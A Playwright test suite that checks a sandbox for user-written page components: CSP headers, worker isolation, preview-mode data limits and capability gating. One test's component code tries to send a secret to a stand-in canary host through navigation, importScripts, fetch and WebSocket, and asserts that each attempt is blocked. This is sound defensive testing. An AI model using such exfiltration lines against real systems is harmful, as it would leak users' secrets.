import { expect, test } from '@playwright/test';
import { COMPONENT_SANDBOX_CSP, componentSandboxWrapper } from '../../backend/src/services/pages/sandboxDocument';

declare global {
  interface Window {
    renderComponentSandboxHarness(input: { code: string; preview?: boolean; stable?: boolean; connectionId?: string; props?: Record<string, unknown>; data?: unknown }): void;
    componentSandboxHarnessCalls: Array<{ method: string; args: unknown[] }>;
    componentSandboxHarnessAskDrafts: string[];
    componentSandboxHarnessNavigations: string[];
    updateComponentSandboxHarness(input: { code?: string; props?: Record<string, unknown>; data?: unknown }): void;
  }
}

const sandboxHeaders = {
  'content-type': 'text/html; charset=utf-8',
  'content-security-policy': `${COMPONENT_SANDBOX_CSP}; frame-ancestors *`,
  'x-content-type-options': 'nosniff',
  'referrer-policy': 'no-referrer',
  'cache-control': 'no-store',
  'permissions-policy': 'camera=(), microphone=(), geolocation=(), payment=(), usb=()',
};

function apiPrefix(connectionId: string): string {
  return connectionId === 'local' ? '/api' : `/api/backend-connections/${connectionId}/proxy`;
}

async function installSandboxDocument(page: import('@playwright/test').Page, connectionId = 'local'): Promise<void> {
  const prefix = apiPrefix(connectionId);
  const response = (body: string, csp: string) => ({
    status: 200,
    headers: { ...sandboxHeaders, 'content-security-policy': csp },
    body,
  });
  await page.route(`**${prefix}/component-sandbox-wrapper`, (route) => {
    const pathname = new URL(route.request().url()).pathname;
    const wrapper = componentSandboxWrapper(pathname);
    return route.fulfill(response(wrapper.html, wrapper.csp));
  });
}

async function openHarness(page: import('@playwright/test').Page, options: {
  code: string;
  preview?: boolean;
  stable?: boolean;
  props?: Record<string, unknown>;
  data?: unknown;
  connectionId?: string;
  hostPreload?: boolean;
}): Promise<void> {
  await page.goto('/test-fixtures/component-sandbox-harness.html');
  await page.waitForFunction(() => typeof window.renderComponentSandboxHarness === 'function');
  if (options.hostPreload) {
    await page.evaluate(() => {
      Object.defineProperty(window, 'electron', { value: { secret: 'preload-secret' } });
      Object.defineProperty(window, 'process', { value: { env: { SECRET: 'node-secret' } } });
    });
  }
  await page.evaluate(({ hostPreload: _hostPreload, ...input }) => window.renderComponentSandboxHarness(input), options);
}

test.describe('page component sandbox security', () => {
  test('stable updates retain a rendered view after candidate errors and only activate a successful replacement', async ({ page }) => {
    await installSandboxDocument(page);
    await openHarness(page, { stable: true, code: "root.textContent = 'Milestone A';" });
    const visible = page.locator('.page-component-slot:not([data-staged]) iframe');
    await expect(visible.contentFrame().locator('#root')).toHaveText('Milestone A');
    const original = await visible.elementHandle();
    await page.evaluate(() => window.updateComponentSandboxHarness({ code: "call('write.rows', []).catch(() => {}); throw new Error('Incomplete milestone B');" }));
    await expect(page.getByRole('status')).toContainText('The previous view is kept');
    await expect(visible.contentFrame().locator('#root')).toHaveText('Milestone A');
    expect(await original!.evaluate(element => element.isConnected)).toBe(true);
    expect(await page.evaluate(() => window.componentSandboxHarnessCalls)).toEqual([]);
    await page.evaluate(() => window.updateComponentSandboxHarness({ code: "root.textContent = 'Milestone C'; const button = document.createElement('button'); button.textContent = 'Save row'; button.addEventListener('click', () => call('write.rows', [])); root.appendChild(button);" }));
    await expect(visible.contentFrame().locator('#root')).toContainText('Milestone C');
    expect(await original!.evaluate(element => element.isConnected)).toBe(false);
    await expect(page.locator('.page-component-frame iframe')).toHaveCount(1);
    await visible.contentFrame().getByRole('button', { name: 'Save row' }).click();
    await expect.poll(() => page.evaluate(() => window.componentSandboxHarnessCalls)).toEqual([{ method: 'write.rows', args: [[]] }]);
  });

  for (const connectionId of ['local', 'pages-remote'] as const) {
    test(`serves the real fixed runner through the ${connectionId === 'local' ? 'direct' : 'proxied'} API and keeps component code off the network`, async ({ page }) => {
    await installSandboxDocument(page, connectionId);
    const sandboxCsp: string[] = [];
    const sandboxUrls: string[] = [];
    page.on('response', (response) => {
      const pathname = new URL(response.url()).pathname;
      if (pathname.endsWith('/component-sandbox-wrapper')) {
        sandboxCsp.push(response.headers()['content-security-policy'] ?? '');
        sandboxUrls.push(pathname);
      }
    });
    const canaryRequests: string[] = [];
    await page.route('https://component-canary.invalid/**', async (route) => {
      canaryRequests.push(route.request().url());
      await route.fulfill({ status: 200, contentType: 'text/plain', body: 'canary' });
    });
    await openHarness(page, { code: `
      const status = document.createElement('span');
      status.dataset.workerGlobals = [typeof window, typeof document, typeof parent, typeof process, typeof require, typeof location, typeof fetch, typeof importScripts, typeof WebSocket].join(':');
      root.appendChild(status);
      const action = document.createElement('button');
      action.textContent = 'Canary action';
      action.addEventListener('click', () => { action.textContent = 'Clicked'; });
      root.appendChild(document.createTextNode('worker canary complete'));
      root.appendChild(action);
      const field = document.createElement('input');
      field.setAttribute('value', 'initial');
      field.setAttribute('aria-label', 'Component input');
      field.addEventListener('input', event => { field.setAttribute('value', event.target.value); });
      root.appendChild(field);
      const asyncResult = document.createElement('span');
      root.appendChild(asyncResult);
      call('read.host').then(() => { asyncResult.textContent = 'async capability rendered'; });
      const attempts = [];
      try { location.href = 'https://component-canary.invalid/navigate?secret=' + encodeURIComponent(data.secret); attempts.push('navigation-allowed'); } catch (_) { attempts.push('navigation-blocked'); }
      try { importScripts('https://component-canary.invalid/import.js?secret=' + encodeURIComponent(data.secret)); attempts.push('import-allowed'); } catch (_) { attempts.push('import-blocked'); }
      try { fetch('https://component-canary.invalid/fetch?secret=' + encodeURIComponent(data.secret)); attempts.push('fetch-allowed'); } catch (_) { attempts.push('fetch-blocked'); }
      try { new WebSocket('wss://component-canary.invalid/socket?secret=' + encodeURIComponent(data.secret)); attempts.push('socket-allowed'); } catch (_) { attempts.push('socket-blocked'); }
      status.textContent = attempts.join(',');
    `, hostPreload: true, connectionId });

    const frame = page.frameLocator('.page-component-frame iframe');
    await expect(frame.locator('#root')).toContainText('navigation-blocked,import-blocked,fetch-blocked,socket-blocked');
    await expect(frame.locator('#root')).toContainText('worker canary complete');
    await expect(frame.locator('#root')).toContainText('async capability rendered');
    await expect(frame.locator('[data-worker-globals]')).toHaveAttribute('data-worker-globals', 'undefined:object:undefined:undefined:undefined:undefined:undefined:undefined:undefined');
    await frame.getByRole('button', { name: 'Canary action' }).click();
    await expect(frame.getByRole('button')).toHaveText('Clicked');
    await frame.getByRole('textbox', { name: 'Component input' }).fill('typed');
    await expect(frame.getByRole('textbox', { name: 'Component input' })).toHaveValue('typed');
    await expect.poll(() => page.evaluate(() => window.componentSandboxHarnessCalls)).toEqual([{ method: 'read.host', args: [] }]);
    expect(sandboxCsp.join('\n')).toContain("default-src 'none'");
    expect(sandboxCsp.join('\n')).toContain("connect-src 'none'");
    expect(sandboxCsp.join('\n')).toContain('worker-src blob:');
    expect(sandboxCsp.join('\n')).toContain("frame-src 'none'");
    expect(sandboxCsp.join('\n')).toContain('sandbox allow-scripts');
    expect(sandboxUrls).toEqual(expect.arrayContaining([
      `${apiPrefix(connectionId)}/component-sandbox-wrapper`,
    ]));
    const sandboxUrl = new URL(await page.locator('.page-component-frame iframe').getAttribute('src') ?? '', page.url());
    expect(sandboxUrl.hostname).toBe(new URL(page.url()).hostname);
    await expect.poll(() => canaryRequests).toEqual([]);
    });
  }

  test('updates reuse the same worker and component state', async ({ page }) => {
    await installSandboxDocument(page);
    await openHarness(page, { props: { title: 'first' }, code: `
      globalThis.componentStarts = (globalThis.componentStarts || 0) + 1;
      const status = document.createElement('span');
      status.dataset.starts = String(globalThis.componentStarts);
      root.textContent = props.title;
      root.appendChild(status);
      globalThis.onMichiComponentUpdate = nextProps => { root.textContent = nextProps.title; root.appendChild(status); };
    ` });
    const frame = page.frameLocator('.page-component-frame iframe');
    await expect(frame.locator('[data-starts]')).toHaveAttribute('data-starts', '1');
    await page.evaluate(() => window.updateComponentSandboxHarness({ props: { title: 'updated' } }));
    await expect(frame.locator('#root')).toHaveText('updated');
    await expect(frame.locator('[data-starts]')).toHaveAttribute('data-starts', '1');
  });

  test('nested controls bubble events once and respect stopPropagation', async ({ page }) => {
    await installSandboxDocument(page);
    await openHarness(page, { code: `
      let count = 0;
      const status = document.createElement('p');
      status.textContent = 'Clicks 0';
      const button = document.createElement('button');
      const label = document.createElement('span');
      label.textContent = 'Nested target';
      button.appendChild(label);
      button.addEventListener('click', event => {
        status.textContent = 'Clicks ' + (++count);
        event.stopPropagation();
      });
      root.addEventListener('click', () => { status.textContent = 'Unexpected parent handler'; });
      root.append(button, status);
    ` });
    const frame = page.locator('.page-component-frame iframe').contentFrame();
    await frame.getByText('Nested target', { exact: true }).click();
    await expect(frame.locator('#root')).toContainText('Clicks 1');
    await frame.getByText('Nested target', { exact: true }).click();
    await expect(frame.locator('#root')).toContainText('Clicks 2');
  });

  test('timer and promise mutations repaint without a host update or another click', async ({ page }) => {
    await installSandboxDocument(page);
    await openHarness(page, { stable: true, code: `
      const count = document.createElement('span');
      count.textContent = '0';
      count.setAttribute('aria-label', 'Timer count');
      const action = document.createElement('button');
      action.textContent = 'Start timer';
      action.addEventListener('click', () => {
        let ticks = 0;
        const timer = setInterval(() => {
          count.textContent = String(++ticks);
          if (ticks === 3) {
            clearInterval(timer);
            Promise.resolve().then(() => {
              action.textContent = 'Finished';
              action.setAttribute('disabled', '');
              action.dataset.finished = 'yes';
              action.style.opacity = '0.5';
              const done = document.createElement('p');
              done.textContent = 'Async result';
              root.appendChild(done);
              const clear = document.createElement('button');
              clear.textContent = 'Clear result';
              clear.addEventListener('click', () => setTimeout(() => root.removeChild(done), 0));
              root.appendChild(clear);
            });
          }
        }, 100);
      });
      root.append(count, action);
    ` });
    const frame = page.locator('.page-component-slot:not([data-staged]) iframe').contentFrame();
    await frame.getByRole('button', { name: 'Start timer' }).click();
    await expect(frame.locator('[aria-label="Timer count"]')).toHaveText('3');
    const finished = frame.getByRole('button', { name: 'Finished' });
    await expect(finished).toBeDisabled();
    await expect(finished).toHaveAttribute('data-finished', 'yes');
    await expect(finished).toHaveCSS('opacity', '0.5');
    await expect(frame.getByText('Async result', { exact: true })).toBeVisible();
    await frame.getByRole('button', { name: 'Clear result' }).click();
    await expect(frame.getByText('Async result', { exact: true })).toHaveCount(0);
  });

  test('preview receives only synthetic data and cannot call capabilities, ask, navigate, or write', async ({ page }) => {
    await installSandboxDocument(page);
    const apiRequests: string[] = [];
    page.on('request', (request) => {
      if (new URL(request.url()).pathname.includes('/component-capabilities')) apiRequests.push(request.url());
    });
    await openHarness(page, { preview: true, data: { secret: 'must-not-reach-preview' }, code: `
      root.textContent = JSON.stringify(data);
      const status = document.createElement('span');
      root.appendChild(status);
      Promise.allSettled([
        call('read.host'), call('read.database'), call('write.rows', []), call('ask.draft', 'draft'), call('navigate.page', 'page-1')
      ]).then(results => { status.textContent = results.map(result => result.status).join(','); });
    ` });

    const frame = page.frameLocator('.page-component-frame iframe');
    await expect(frame.locator('#root')).toContainText('rejected,rejected,rejected,rejected,rejected');
    await expect(frame.locator('#root')).toContainText('"sample":true');
    await expect(frame.locator('#root')).not.toContainText('must-not-reach-preview');
    await expect.poll(() => page.evaluate(() => window.componentSandboxHarnessCalls)).toEqual([]);
    await expect.poll(() => page.evaluate(() => window.componentSandboxHarnessAskDrafts)).toEqual([]);
    await expect.poll(() => page.evaluate(() => window.componentSandboxHarnessNavigations)).toEqual([]);
    expect(apiRequests).toEqual([]);
  });

  test('oversized render reports a bounded failure and can be stopped without freezing the host', async ({ page }) => {
    await installSandboxDocument(page);
    await openHarness(page, { code: `
      for (let index = 0; index < 2001; index += 1) root.appendChild(document.createElement('span'));
    ` });
    await expect(page.getByRole('alert')).toContainText('Component render is too large');
    await page.getByRole('button', { name: 'Stop component' }).click();
    await expect(page.getByRole('status')).toHaveText('Component stopped. Remove it or reload to run it again.');
  });
});
